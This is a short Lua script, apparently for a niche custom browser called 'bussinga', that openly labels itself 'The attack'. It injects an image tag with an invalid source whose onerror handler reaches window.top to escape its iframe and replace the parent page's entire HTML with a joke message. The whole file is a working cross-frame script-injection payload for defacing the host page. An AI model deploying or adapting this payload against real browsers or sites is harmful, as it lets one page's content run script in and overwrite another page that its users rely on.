if window ~= nil then
  if window.browser == 'bussinga' then
    -- The attack
    -- Since the image has an invalid source, onerror will run
    -- window.top escpaces the iframe and then sets the body to a good messgae :3
    get('l').set_content('<img src="x" onerror="window.top.document.querySelector(`html`).innerHTML=`<p>men kissing</p>`">')
  end
end
